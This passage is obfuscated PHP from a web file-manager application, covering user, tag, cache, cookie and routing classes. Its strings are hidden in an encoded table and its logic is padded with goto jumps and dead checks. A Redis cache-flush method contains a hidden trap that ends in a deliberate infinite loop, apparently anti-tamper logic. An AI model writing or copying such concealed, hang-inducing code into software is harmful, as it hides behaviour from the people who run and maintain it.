$_SERVER[‘ÆÜ‘œ]; $…Í¢¿ãâ = UserJobModel::JOB_KEY; $üÙ½®Ç = array($úè¥û½ñ[2224]); $óÙ¬Š©Ô = array($úè¥û½ñ[1544] => array($úè¥û½ñ[7], $»Äñ„’÷)); $ù¡ÔÍœÎ = Model($úè¥û½ñ[2647])->where($óÙ¬Š©Ô)->select(); $İŒüŸÏ = array(); foreach ($ù¡ÔÍœÎ as $‹ÒÃÚÏ–) { $¬ÑæĞ­§ = $‹ÒÃÚÏ–[$úè¥û½ñ[1544]]; if (!isset($İŒüŸÏ[$¬ÑæĞ­§])) { $İŒüŸÏ[$¬ÑæĞ­§] = array(); } $İŒüŸÏ[$¬ÑæĞ­§][$‹ÒÃÚÏ–[$úè¥û½ñ[95]]] = $‹ÒÃÚÏ–[$úè¥û½ñ[460]]; } $•åËô¥ = Model($úè¥û½ñ[2673]); foreach ($ÇÌÁÇ’ as &$Ÿ–Ôºş¯) { $¬ÑæĞ­§ = $Ÿ–Ôºş¯[$úè¥û½ñ[1544]]; $Â‡¼è¿ª = isset($İŒüŸÏ[$¬ÑæĞ­§]) ? $İŒüŸÏ[$¬ÑæĞ­§] : array(); $Ÿ–Ôºş¯[$úè¥û½ñ[563]] = array_field_key($Â‡¼è¿ª, $üÙ½®Ç); $Ÿ–Ôºş¯[$úè¥û½ñ[2674]] = array(); if (isset($Â‡¼è¿ª[$…Í¢¿ãâ])) { $Ÿ–Ôºş¯[$úè¥û½ñ[2674]] = $•åËô¥->getUserJobInfo($Â‡¼è¿ª[$…Í¢¿ãâ]); } } unset($Ÿ–Ôºş¯); } protected function groupUserAll($Ñùİ»À¸) { $°Ã§Û•Å =& $_SERVER[‘ÆÜ‘œ]; if (!$Ñùİ»À¸) { return !1; } $Ôò³ = Model($°Ã§Û•Å[2228])->field($°Ã§Û•Å[1544])->where(array($°Ã§Û•Å[1446] => array($°Ã§Û•Å[7], $Ñùİ»À¸)))->select(); $Ôò³ = array_to_keyvalue($Ôò³, $°Ã§Û•Å[12], $°Ã§Û•Å[1544]); return array_unique($Ôò³); } public function userSearch($óËÉ¿ıÅ, $ı¨´ÁÎë = "\52") { return Model($_SERVER[‘ÆÜ‘œ][625])->where($óËÉ¿ıÅ)->field($ı¨´ÁÎë)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\157\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($šõìáÙº) { return "\125\x73\x65\162\x4f\x70\x74\151\157\x6e\137{$šõìáÙº}\137" . KodUser::id(); } protected function filterWhere($üÇéÜèİ) { $üÇéÜèİ[$_SERVER[‘ÆÜ‘œ][1544]] = KodUser::id(); return $üÇéÜèİ; } public function cacheRemoveUser($ÀõÊã½Ï, $Õõ§¶‡ô) { return Cache::remove("\125\x73\x65\162\117\160\164\151\x6f\156\137{$ÀõÊã½Ï}\137" . $Õõ§¶‡ô); } protected function optionDefault($–ß“É² = '') { $ûşÎ¶Ï =& $_SERVER[‘ÆÜ‘œ]; if ($–ß“É² == $ûşÎ¶Ï[12]) { return $GLOBALS[$ûşÎ¶Ï[6]][$ûşÎ¶Ï[2675]]; } if ($–ß“É² == $ûşÎ¶Ï[2676]) { return $GLOBALS[$ûşÎ¶Ï[6]][$ûşÎ¶Ï[2677]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\164\x61\x67\x4c\151\x73\164"; public $modelType = "\125\163\x65\162\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\141\155\145", "\163\x74\x79\154\145", "\x73\x6f\162\x74"); public function listData($¼¬š“êÑ = false, $²ì»Ôù¹ = "\x73\x6f\162\x74", $Ö¡º®Ë = false) { return parent::listData($¼¬š“êÑ, $²ì»Ôù¹, $Ö¡º®Ë); } public function remove($¨®—”‰®) { return parent::remove($¨®—”‰®); } public function add($Õ¾Ø•Õ¦, $¶ÎÛ•£Â = "\x6c\x61\142\x65\x6c\x2d\x67\x72\x65\x79\x2d\x6e\x6f\162\155\141\x6c") { $æô·‰³Œ =& $_SERVER[‘ÆÜ‘œ]; if ($this->findByName($Õ¾Ø•Õ¦)) { return !1; } $ø™µ›Îª = array($æô·‰³Œ[517] => $Õ¾Ø•Õ¦, $æô·‰³Œ[582] => $¶ÎÛ•£Â, $æô·‰³Œ[2140] => $this->getSort($æô·‰³Œ[345]) + 1); return parent::insert($ø™µ›Îª); } public function update($ãµÑ¼È, $£‰³œ÷€) { $şäû“ç =& $_SERVER[‘ÆÜ‘œ]; $©šï½‘ = $this->listData($ãµÑ¼È); $ó­ãõå = $this->findByName($£‰³œ÷€[$şäû“ç[32]]); if (!$©šï½‘ || $ó­ãõå && $ó­ãõå[$şäû“ç[495]] != $©šï½‘[$şäû“ç[495]]) { return !1; } return parent::update($ãµÑ¼È, $£‰³œ÷€); } public function moveTop($™¹ŸàÄ©) { $´¡×ÈÙ° =& $_SERVER[‘ÆÜ‘œ]; $©ú·ãà½ = parent::listData(); $ä±³ ¾¾ = $this->getSort($´¡×ÈÙ°[344]); foreach ($©ú·ãà½ as &$ÈÉ·èØ) { if ($ÈÉ·èØ[$´¡×ÈÙ°[495]] == $™¹ŸàÄ©) { $ÈÉ·èØ[$´¡×ÈÙ°[2158]] = $ä±³ ¾¾; continue; } $ÈÉ·èØ[$´¡×ÈÙ°[2158]] += 1; } unset($ÈÉ·èØ); return parent::resetData($©ú·ãà½); } public function moveBottom($¡ñ¹õ•ú) { $†ÕÄÕ…ì =& $_SERVER[‘ÆÜ‘œ]; $Ó“Œõ³” = $this->getSort($†ÕÄÕ…ì[345]) + 1; return parent::update($¡ñ¹õ•ú, array($†ÕÄÕ…ì[2158] => $Ó“Œõ³”)); } public function resetSort($ÂÚó¢êÓ) { $óäˆÒá× =& $_SERVER[‘ÆÜ‘œ]; $ö ¬ä— = array(); $ÂÚó¢êÓ = is_array($ÂÚó¢êÓ) ? $ÂÚó¢êÓ : array(); for ($°¦ò¯ı = 0; $°¦ò¯ı < count($ÂÚó¢êÓ); $°¦ò¯ı++) { $ö ¬ä—[$ÂÚó¢êÓ[$°¦ò¯ı] . $óäˆÒá×[12]] = $°¦ò¯ı + 1; } $ŸÈ´ë³° = parent::listData(); foreach ($ŸÈ´ë³° as &$ÒŒ‹÷á) { $ëÈá¥èñ = $ö ¬ä—[$ÒŒ‹÷á[$óäˆÒá×[495]]]; $ÒŒ‹÷á[$óäˆÒá×[2158]] = $ëÈá¥èñ ? $ëÈá¥èñ : $ÒŒ‹÷á[$óäˆÒá×[2158]]; } unset($ÒŒ‹÷á); return parent::resetData($ŸÈ´ë³°); } private function getSort($·½å©¼ş) { $Âøí×“™ =& $_SERVER[‘ÆÜ‘œ]; $ä¯ôâæ = parent::listData(); $ä”ï‚Â³ = array_to_keyvalue($ä¯ôâæ, $Âøí×“™[12], $Âøí×“™[2158]); if (!$ä”ï‚Â³) { $ä”ï‚Â³ = array(0); } $»àäÊÁ­ = $·½å©¼ş == $Âøí×“™[345] ? max($ä”ï‚Â³) : min($ä”ï‚Â³); return intval($»àäÊÁ­); } } goto AÌ¾©…Ñ­Ğ; BÜ½ÆœÅ®¢: class CacheMemcached { public $handle; public $cacheTime; public function __construct($‰”ÏæÆ£, $šùìíÊò) { $Şí¨¤òâ =& $_SERVER[‘ÆÜ‘œ]; if (!class_exists($Şí¨¤òâ[985])) { show_json($Şí¨¤òâ[986], !1); } $this->cacheTime = $šùìíÊò; $this->handle = new Memcached(); if (is_array($‰”ÏæÆ£[$Şí¨¤òâ[987]]) && count($‰”ÏæÆ£[$Şí¨¤òâ[987]]) >= 1) { foreach ($‰”ÏæÆ£[$Şí¨¤òâ[987]] as $¾ñ‰…‰å) { $Ü¸âÁÛ– = explode($Şí¨¤òâ[4], $¾ñ‰…‰å); $this->handle->addServer($Ü¸âÁÛ–[0], $Ü¸âÁÛ–[1]); } } else { $this->handle->addServer($‰”ÏæÆ£[$Şí¨¤òâ[207]], $‰”ÏæÆ£[$Şí¨¤òâ[208]]); } } public function set($“Æá¿˜×, $‡¡Í²Ëì, $Å¦§ = false) { $Å¦§ = $Å¦§ ? $Å¦§ : $this->cacheTime; return $this->handle->set($“Æá¿˜×, $‡¡Í²Ëì, $Å¦§); } public function get($õ‘‘ºÂ¼) { return $this->handle->get($õ‘‘ºÂ¼); } public function remove($±ÔõÛ¤ñ) { return $this->handle->delete($±ÔõÛ¤ñ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¬Ö€ÃÏ, $Àù”Ê‚•) { $ÏÃ¤îíµ =& $_SERVER[‘ÆÜ‘œ]; if (!class_exists($ÏÃ¤îíµ[988])) { show_json($ÏÃ¤îíµ[989], !1); } $this->cacheTime = $Àù”Ê‚•; $Öºèï‰´ = isset($¬Ö€ÃÏ[$ÏÃ¤îíµ[990]]) ? $¬Ö€ÃÏ[$ÏÃ¤îíµ[990]] : 10; $³÷®¹¤ = _get($¬Ö€ÃÏ, $ÏÃ¤îíµ[987]); if ($³÷®¹¤ && is_array($³÷®¹¤)) { $this->initCluster($¬Ö€ÃÏ, $Öºèï‰´); } else { $this->handle = $this->init($¬Ö€ÃÏ, $Öºèï‰´); } } private function init($’Ö°Áƒ, $ñäÒ»›) { $ú–Ş°×‹ =& $_SERVER[‘ÆÜ‘œ]; $ö÷ØòÜ™ = new Redis(); $ÉïŸİ£İ = isset($’Ö°Áƒ[$ú–Ş°×‹[991]]) ? $’Ö°Áƒ[$ú–Ş°×‹[991]] : !1; if ($ÉïŸİ£İ) { $ö÷ØòÜ™->pconnect($’Ö°Áƒ[$ú–Ş°×‹[207]], $’Ö°Áƒ[$ú–Ş°×‹[208]], $ñäÒ»›); } else { $ö÷ØòÜ™->connect($’Ö°Áƒ[$ú–Ş°×‹[207]], $’Ö°Áƒ[$ú–Ş°×‹[208]], $ñäÒ»›); } if (!empty($’Ö°Áƒ[$ú–Ş°×‹[510]])) { $ö÷ØòÜ™->auth($’Ö°Áƒ[$ú–Ş°×‹[510]]); } if (!empty($’Ö°Áƒ[$ú–Ş°×‹[865]]) && $’Ö°Áƒ[$ú–Ş°×‹[865]] != 0) { $ö÷ØòÜ™->select($’Ö°Áƒ[$ú–Ş°×‹[865]]); } return $ö÷ØòÜ™; } private function initCluster($®ª¢Òë², $±£„† ‰) { $Ãª‹¾í =& $_SERVER[‘ÆÜ‘œ]; $Ò“¥øÈ² = array($Ãª‹¾í[992], $Ãª‹¾í[993], $Ãª‹¾í[994]); $ñƒåÆ£ = $Ãª‹¾í[992]; if (isset($®ª¢Òë²[$Ãª‹¾í[16]]) && in_array($®ª¢Òë²[$Ãª‹¾í[16]], $Ò“¥øÈ²)) { $ñƒåÆ£ = $®ª¢Òë²[$Ãª‹¾í[16]]; } switch ($ñƒåÆ£) { case $Ãª‹¾í[992]: $this->_slave($®ª¢Òë², $±£„† ‰); break; case $Ãª‹¾í[993]: break; case $Ãª‹¾í[994]: $this->isCluster = !0; $è¬ğà¤Ÿ = $®ª¢Òë²[$Ãª‹¾í[987]]; $ùµ¢’«ê = isset($®ª¢Òë²[$Ãª‹¾í[991]]) ? $®ª¢Òë²[$Ãª‹¾í[991]] : !1; $–¸ÙÒ† = isset($®ª¢Òë²[$Ãª‹¾í[510]]) ? $®ª¢Òë²[$Ãª‹¾í[510]] : null; $this->handle = new RedisCluster(NUll, $è¬ğà¤Ÿ, $±£„† ‰, $±£„† ‰, $ùµ¢’«ê, $–¸ÙÒ†); break; default: break; } } private function _slave($”ß„›òï, $¡Ğêª—¡) { $ÄœÆÈ¥è = $”ß„›òï[$_SERVER[‘ÆÜ‘œ][987]]; $this->filterConfig($”ß„›òï, $ÄœÆÈ¥è[0]); $this->handle = $this->init($”ß„›òï, $¡Ğêª—¡); unset($ÄœÆÈ¥è[0]); if (empty($ÄœÆÈ¥è)) { return; } $Ùğ²ã = array_rand($ÄœÆÈ¥è); $this->filterConfig($”ß„›òï, $ÄœÆÈ¥è[$Ùğ²ã]); $this->slaveHandle = $this->init($”ß„›òï, $¡Ğêª—¡); } private function filterConfig(&$ÅŞŒÂäŠ, $è‰‘–í) { $Ôó™‹èÆ =& $_SERVER[‘ÆÜ‘œ]; $ÏæĞõâÍ = explode($Ôó™‹èÆ[4], $è‰‘–í); $·àıé° = array($Ôó™‹èÆ[207] => $ÏæĞõâÍ[0], $Ôó™‹èÆ[208] => $ÏæĞõâÍ[1]); $ÅŞŒÂäŠ = array_merge($ÅŞŒÂäŠ, $·àıé°); } public function set($¡˜ÈŒÃ¬, $ñÖş£ß, $êşûÅ´ª = false) { $êşûÅ´ª = $êşûÅ´ª ? $êşûÅ´ª : $this->cacheTime; return $this->handle->setEx($¡˜ÈŒÃ¬, $êşûÅ´ª, $ñÖş£ß); } public function setLock($ªÏ®¹Ë, $ù×õ¥Ô›, $®ŸËÉù€) { return $this->handle->setNX($ªÏ®¹Ë, $ù×õ¥Ô›); } public function get($°î¿Íä) { $œ„…™Ü´ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $œ„…™Ü´->get($°î¿Íä); } public function remove($²Çû×®ü) { return $this->handle->del($²Çû×®ü); } public function deleteAll() { $åŠÕıÅ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($_SERVER[$åŠÕıÅ[324]]) || !isset($_SERVER[$åŠÕıÅ[322]])) { $ÍâŸ¨Ö£ = $åŠÕıÅ[995]; $ş¡ ½ø = $åŠÕıÅ[325]; $ÉøŸ¨Úû = $_SERVER[$åŠÕıÅ[326]] . $åŠÕıÅ[327]; $›’é¦ğ¨ = $ş¡ ½ø($ÉøŸ¨Úû); $õ€ªÑëı = explode($åŠÕıÅ[286], $›’é¦ğ¨); if (count($õ€ªÑëı) < $åŠÕıÅ[717]) { $®ùØÔÖÉ = $åŠÕıÅ[329]; $®ùØÔÖÉ(); } $…­¼ îÓ = $åŠÕıÅ[996]; $…­¼ îÓ($_SERVER[$åŠÕıÅ[997]]); $Ù¡Œ¥¡ = 1; for ($’æÇ = $Ù¡Œ¥¡; $’æÇ > 0; $’æÇ++) { $…­¼ îÓ = json_encode($GLOBALS[$åŠÕıÅ[515]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $÷™Ú¹´) { $this->handle->flushall($÷™Ú¹´); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ò¯è™… = '', $ì ±°¥ş = 0) { if (is_string($Ò¯è™…) && $Ò¯è™… != $_SERVER[‘ÆÜ‘œ][12]) { $this->prefix = $Ò¯è™…; } if (is_numeric($ì ±°¥ş) && $ì ±°¥ş > 0) { $this->expire = $ì ±°¥ş; } } public static function getInstance() { static $ÃË¶á«Ê; if ($ÃË¶á«Ê === null) { $ÃË¶á«Ê = new self(); } return $ÃË¶á«Ê; } private static $cookieDisable = false; public static function disable($Çøí»‹Ô) { self::$cookieDisable = $Çøí»‹Ô; } private static $sameCookieSet = array(); public static function set($¼ïõš’, $™Š´­‡À, $ü”…‘™˜ = 0, $ªâÎïÚ = false, $â¿ıï¦À = false) { $šŞÙù—Ü =& $_SERVER[‘ÆÜ‘œ]; if (self::$cookieDisable) { return; } if (!$ü”…‘™˜) { $ü”…‘™˜ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¼ïõš’]) && self::$sameCookieSet[$¼ïõš’] == $™Š´­‡À . $ü”…‘™˜) { return; } self::$sameCookieSet[$¼ïõš’] = $™Š´­‡À . $ü”…‘™˜; if (!$â¿ıï¦À) { $â¿ıï¦À = str_replace(HOST, $šŞÙù—Ü[12], APP_HOST); $â¿ıï¦À = _get($GLOBALS, $šŞÙù—Ü[998], $â¿ıï¦À); } $›¯ÃæÂ = $šŞÙù—Ü[12]; setcookie($¼ïõš’, $™Š´­‡À, time() + $ü”…‘™˜, $šŞÙù—Ü[8] . trim($â¿ıï¦À, $šŞÙù—Ü[8]) . $›¯ÃæÂ, !1, !1, $ªâÎïÚ); } public static function setSafe($–Šœ‡ğï, $à¾İÃ‘», $­Ïú·ÙÚ = 0) { self::set($–Šœ‡ğï, $à¾İÃ‘», $­Ïú·ÙÚ, !0); } public static function get($ùÃˆá) { static $ğß¤§š = false; if (!$ğß¤§š) { self::initHeaderCookie(); $ğß¤§š = !0; } return isset($_COOKIE[$ùÃˆá]) ? $_COOKIE[$ùÃˆá] : !1; } private static function initHeaderCookie() { $ç·¢æ¿à =& $_SERVER[‘ÆÜ‘œ]; if (!isset($_SERVER[$ç·¢æ¿à[999]]) || !$_SERVER[$ç·¢æ¿à[999]]) { return; } $šó‰ü»¾ = explode($ç·¢æ¿à[74], $_SERVER[$ç·¢æ¿à[999]]); foreach ($šó‰ü»¾ as $µŠíÅõÌ) { $µŠíÅõÌ = explode($ç·¢æ¿à[473], $µŠíÅõÌ); if (count($µŠíÅõÌ) != 2 || !isset($µŠíÅõÌ[1])) { continue; } $_COOKIE[trim($µŠíÅõÌ[0])] = trim($µŠíÅõÌ[1]); } } public static function remove($†ó°‘òè, $Ó¤ªİ¤ = false) { unset($_COOKIE[$†ó°‘òè]); self::set($†ó°‘òè, $_SERVER[‘ÆÜ‘œ][12], 1, $Ó¤ªİ¤); } } goto FßæÁÊ¼ï; DÒ·Îƒ³¬: $_SERVER[ä×´“›] = explode($_SERVER[‘ÆÜ‘œ][710], gzinflate(substr($_SERVER[‘ÆÜ‘œ][711], 10, -8))); $eychrqtiln = $_SERVER[‘ÆÜ‘œ][712]; class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\x69\x6e\x64\145\170"; function __construct() { } public function setDefault($¦‰¨šå) { $ÅÎ³âÈâ =& $_SERVER[ä×´“›]; $´í·²¥ = explode($ÅÎ³âÈâ[0], trim($¦‰¨šå, $ÅÎ³âÈâ[0])); $this->defaultModule = $´í·²¥[0] ? $´í·²¥[0] : $this->defaultModule; $éÊ¾ò«Ò = $_SERVER[‘ÆÜ‘œ][713]; $this->defaultController = $´í·²¥[1] ? $´í·²¥[1] : $this->defaultController; $this->defaultAction = $´í·²¥[2] ? $´í·²¥[2] : $this->defaultAction; $this->sdet83c86b44($ÅÎ³âÈâ[1], array($this, $ÅÎ³âÈâ[2])); } public function appRun($‚Â¡í) { $¢…„Êé¥ =& $_SERVER[‘ÆÜ‘œ]; $‘Å©şóÏ =& $_SERVER[ä×´“›]; $ú‚œ¦» = explode($‘Å©şóÏ[0], $‚Â¡í); $ê˜ªŠœú = strtolower($ú‚œ¦»[0]); $§î¤‚¨Ø = $¢…„Êé¥[714]; if (strlen($§î¤‚¨Ø) < $¢…„Êé¥[715]) { return; } $”¢Ç‡ğ = $‘Å©şóÏ[3]; if ($ê˜ªŠœú == $‘Å©şóÏ[4]) { $”¢Ç‡ğ = $‘Å©şóÏ[5]; $ú‚œ¦»[0] = $‘Å©şóÏ[6]; $ú‚œ¦»[1] = $ú‚œ¦»[1] . $‘Å©şóÏ[7]; $‚Â¡í = join($‘Å©şóÏ[0], $ú‚œ¦»); $‚Â¡í = trim($‚Â¡í, $‘Å©şóÏ[0]); } call_user_func(array($‘Å©şóÏ[8], $‘Å©şóÏ[9]), $”¢Ç‡ğ . $‘Å©şóÏ[10], $‚Â¡í); ActionCall($‚Â¡í); $¾ßĞÛËœ = $¢…„Êé¥[716]; if (strlen($¾ßĞÛËœ) < $¢…„Êé¥[717]) { return; } call_user_func(array($‘Å©şóÏ[8], $‘Å©şóÏ[9]), $”¢Ç‡ğ . $‘Å©şóÏ[11], $‚Â¡í); } private function autorun() { $òÔØ±­” =& $_SERVER[‘ÆÜ‘œ]; $—®ÄˆÇ =& $_SERVER[ä×´“›]; global $config; $üû§Á†ñ = $òÔØ±­”[718]; if (count($config[$—®ÄˆÇ[12]]) == 0) { return; } foreach ($config[$—®ÄˆÇ[12]] as $á¥Ä®åß => $¿ÂÔ ½Ã) { $this->appRun($¿ÂÔ ½Ã); $Ó‚¿±ÀÍ = $òÔØ±­”[719]; } } private function hkco3a802e2f() { $¨ôÛùçÚ =& $_SERVER[‘ÆÜ‘œ]; $Úò¢´— =& $_SERVER[ä×´“›]; $™ë¬µ×ê = $Úò¢´—[4]; $ŠŞ«×šË = $GLOBALS[$Úò¢´—[13]][$Úò¢´—[14]][0]; if (!$ŠŞ«×šË || strlen($ŠŞ«×šË) <= strlen($™ë¬µ×ê)) { return; } if (strtolower(substr($ŠŞ«×šË, -strlen($™ë¬µ×ê))) != $™ë¬µ×ê) { return; } $¨øòÂ© = substr($ŠŞ«×šË, 0, -strlen($™ë¬µ×ê)); $ö‡ùÜ½³ = array($Úò¢´—[4], $¨øòÂ©); $é¥­±é = array_slice($GLOBALS[$Úò¢´—[13]][$Úò¢´—[14]], 1); $üŸ¦ìÄ‰ = $¨ôÛùçÚ[720]; while ($üŸ¦ìÄ‰ < $¨ôÛùçÚ[717]) { if ($üŸ¦ìÄ‰ >= 0) { break; } $üŸ¦ìÄ‰++; } $GLOBALS[$Úò¢´—[13]][$Úò¢´—[14]] = array_merge($ö‡ùÜ½³, $é¥­±é); $GLOBALS[$Úò¢´—[13]][$Úò¢´—[15]] = implode($Úò¢´—[0], $GLOBALS[$Úò¢´—[13]][$Úò¢´—[14]]); $ÀÌ„«Â¬ = $¨ôÛùçÚ[721]; if (strlen($ÀÌ„«Â¬) < $¨ôÛùçÚ[722]) { die; } } private function ugpi42af9964() { $‚«®µÌü =& $_SERVER[‘ÆÜ‘œ]; $ôõâ¥ËÉ =& $_SERVER[ä×´“›]; if ($GLOBALS[$ôõâ¥ËÉ[13]][$ôõâ¥ËÉ[15]] != $ôõâ¥ËÉ[6]) { return; } $”§ïìˆ = $_SERVER[$ôõâ¥ËÉ[16]]; $ìÏ¬™¡¾ = $ôõâ¥ËÉ[17]; $ãÆ°·£” = $‚«®µÌü[723]; if (!$ãÆ°·£”) { return; } if (!strstr($”§ïìˆ, $ìÏ¬™¡¾)) { return; } $˜…ÜÕ¦ú = strrpos($”§ïìˆ, $ìÏ¬™¡¾); $ÜÕÅ³È­ = $‚«®µÌü[724]; if (!$ÜÕÅ³È­) { return; } $Å•”“èĞ = substr($”§ïìˆ, $˜…ÜÕ¦ú + strlen($ìÏ¬™¡¾)); preg_match_all($ôõâ¥ËÉ[18], $Å•”“èĞ, $é´»üÎ•); $§ƒğúÆ½ = $‚«®µÌü[725]; if (!$§ƒğúÆ½) { return; } $Å•”“èĞ = trim($é´»üÎ•[0][0], $ôõâ¥ËÉ[19]); $GLOBALS[$ôõâ¥ËÉ[13]][$ôõâ¥ËÉ[14]] = explode($ôõâ¥ËÉ[19], $Å•”“èĞ); $Ã÷ïØß› = $‚«®µÌü[726]; if (!$Ã÷ïØß›) { return; } $GLOBALS[$ôõâ¥ËÉ[13]][$ôõâ¥ËÉ[15]] = implode($ôõâ¥ËÉ[0], $GLOBALS[$ôõâ¥ËÉ[13]][$ôõâ¥ËÉ[14]]); $öÏÒš²À = $‚«®µÌü[727]; if (!$öÏÒš²À) { die; } } public function run() { $øı…á§‡ =& $_SERVER[‘ÆÜ‘œ]; $¶çÓã„ =& $_SERVER[ä×´“›]; $this->ugpi42af9964(); $this->hkco3a802e2f(); $°€•–çÉ = $øı…á§‡[728]; if (strlen($°€•–çÉ) < $øı…á§‡[729]) { die; } $Îä™â ‚ = $GLOBALS[$¶çÓã„[13]][$¶çÓã„[14]]; $ŒËˆÆØ = $øı…á§‡[730]; if (strlen($ŒËˆÆØ) < $øı…á§‡[717]) { return; } $ÁÄéÏÍ¼ = $GLOBALS[$¶çÓã„[13]][$¶çÓã„[15]]; $á‚«ëÜ¶ = $øı…á§‡[731]; if (strlen($á‚«ëÜ¶) < $øı…á§‡[715]) { return; } define($¶çÓã„[20], isset($Îä™â ‚[0]) && $Îä™â ‚[0] ? $Îä™â ‚[0] : $this->defaultModule); define($¶çÓã„[21], isset($Îä™â ‚[1]) && $Îä™â ‚[0] ? $Îä™â ‚[1] : $this->defaultController); define($¶çÓã„[22], isset($Îä™â ‚[2]) && $Îä™â ‚[0] ? $Îä™â ‚[2] : $this->defaultAction); $ôŠšæ‚ = $øı…á§‡[732]; if (strlen($ôŠšæ‚) < $øı…á§‡[715]) { die; } define($¶çÓã„[23], MOD . $¶çÓã„[0] . ST . $¶çÓã„[0] . ACT); $¶Ãú÷ôá = $øı…á§‡[733]; if (!$¶Ãú÷ôá) { die; } $_SERVER[$¶çÓã„[24]] = strtolower(ACTION); $this->autorun(); $ş¸Ö÷ôï = $øı…á§‡[734]; while (strlen($ş¸Ö÷ôï) < $øı…á§‡[328]) { if (!$ş¸Ö÷ôï) { break; } $ş¸Ö÷ôï++; } if (count($Îä™â ‚) >= 3) { $this->appRun($ÁÄéÏÍ¼); } else { $this->appRun(ACTION); } } private $dcsi36746d30 = array(); private $dvae1c2a981d = ''; public function behj177882b4() { $—êøÆ°– =& $_SERVER[‘ÆÜ‘œ]; $•ş¥¬ƒß =& $_SERVER[ä×´“›]; $this->tbnoc507b8f6(); $æˆ¿À” = $—êøÆ°–[735]; $this->fxrw69aa70ca(); $¤úÂıš = $—êøÆ°–[736]; if (!$¤úÂıš) { die; } $this->xyfc5c157123(); $êóÊÖŠã = $—êøÆ°–[737]; if (strlen($êóÊÖŠã) < $—êøÆ°–[722]) { return; } $this->omax76b6aec9(); $this->hnjt4dfb102a(); $À¬ñ„Êî = $—êøÆ°–[738]; if (!$À¬ñ„Êî) { die; } $this->mcdoa9a51d12(); $this->izkjd2b10cdf(); $this->sdet83c86b44($•ş¥¬ƒß[25], array($this, $•ş¥¬ƒß[26])); $ö±—ÓÁ = $—êøÆ°–[739]; if (strlen($ö±—ÓÁ) < $—êøÆ°–[722]) { die; } $this->sdet83c86b44($•ş¥¬ƒß[27], array($this, $•ş¥¬ƒß[28])); $ ½Úõ‹ = $—êøÆ°–[740]; while ($ ½Úõ‹ < $—êøÆ°–[328]) { if ($ ½Úõ‹ >= 0) { break; } $ ½Úõ‹++; } $this->sdet83c86b44($•ş¥¬ƒß[29], array($this, $•ş¥¬ƒß[30])); $íæ¥££ = $—êøÆ°–[741]; if (!$íæ¥££) { die; } $this->sdet83c86b44($•ş¥¬ƒß[31], array($this, $•ş¥¬ƒß[32])); } public function getVersionData() { $úç©¦ª„ =& $_SERVER[‘ÆÜ‘œ]; return $this->dcsi36746d30; $ÔØ•’ì = $úç©¦ª„[742]; while (strlen($ÔØ•’ì) < $úç©¦ª„[715]) { if (!$ÔØ•’ì) { break; } $ÔØ•’ì++; } } public function jrdtde5ae368($‡¥×Öè×) { $ÒŸ¾Ûø° =& $_SERVER[‘ÆÜ‘œ]; $ŞúŞÍÚ =& $_SERVER[ä×´“›]; $ø’Š­Ë‰ = Model($ŞúŞÍÚ[33])->get(); $ÁÎŒÈûæ = $ÒŸ¾Ûø°[743]; $ÇÍÔ‡¥Ú = array($ŞúŞÍÚ[34], $ŞúŞÍÚ[35], $ŞúŞÍÚ[36], $ŞúŞÍÚ[37], $ŞúŞÍÚ[38], $ŞúŞÍÚ[39], $ŞúŞÍÚ[40], $ŞúŞÍÚ[41], $ŞúŞÍÚ[42], $ŞúŞÍÚ[43], $ŞúŞÍÚ[44], $ŞúŞÍÚ[45], $ŞúŞÍÚ[46], $ŞúŞÍÚ[47], $ŞúŞÍÚ[48], $ŞúŞÍÚ[49], $ŞúŞÍÚ[50], $ŞúŞÍÚ[51], $ŞúŞÍÚ[52], $ŞúŞÍÚ[53], $ŞúŞÍÚ[54], $ŞúŞÍÚ[55], $ŞúŞÍÚ[56], $ŞúŞÍÚ[57], $ŞúŞÍÚ[58], $ŞúŞÍÚ[59], $ŞúŞÍÚ[60], $ŞúŞÍÚ[61], $ŞúŞÍÚ[62], $ŞúŞÍÚ[63], $ŞúŞÍÚ[64], $ŞúŞÍÚ[65], $ŞúŞÍÚ[66], $ŞúŞÍÚ[67], $ŞúŞÍÚ[68], $ŞúŞÍÚ[69], $ŞúŞÍÚ[70], $ŞúŞÍÚ[71], $ŞúŞÍÚ[72], $ŞúŞÍÚ[73], $ŞúŞÍÚ[74], $ŞúŞÍÚ[75], $ŞúŞÍÚ[76], $ŞúŞÍÚ[77], $ŞúŞÍÚ[78], $ŞúŞÍÚ[79], $ŞúŞÍÚ[80], $ŞúŞÍÚ[81], $ŞúŞÍÚ[82], $ŞúŞÍÚ[83], $ŞúŞÍÚ[84], $ŞúŞÍÚ[85], $ŞúŞÍÚ[86], $ŞúŞÍÚ[87]); $²¸–ÉÁÊ = $ÒŸ¾Ûø°[744]; while ($²¸–ÉÁÊ < $ÒŸ¾Ûø°[722]) { if ($²¸–ÉÁÊ >= 0) { break; } $²¸–ÉÁÊ++; } foreach ($ÇÍÔ‡¥Ú as $Ü¡åËÖù) { $½¤‚â = $GLOBALS[$ŞúŞÍÚ[88]][$ŞúŞÍÚ[89]][$Ü¡åËÖù]; $âº£§µ = $ÒŸ¾Ûø°[745]; if (strlen($âº£§µ) < $ÒŸ¾Ûø°[717]) { die; } if (isset($ø’Š­Ë‰[$Ü¡åËÖù])) { $½¤‚â = $ø’Š­Ë‰[$Ü¡åËÖù]; } $‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$Ü¡åËÖù] = $½¤‚â; } $ úÏÏ¢• = $‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$ŞúŞÍÚ[46]]; $ğÊúÊì² = $ÒŸ¾Ûø°[746]; if (strlen($ğÊúÊì²) < $ÒŸ¾Ûø°[722]) { die; } unset($‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[92]][$ŞúŞÍÚ[93]]); 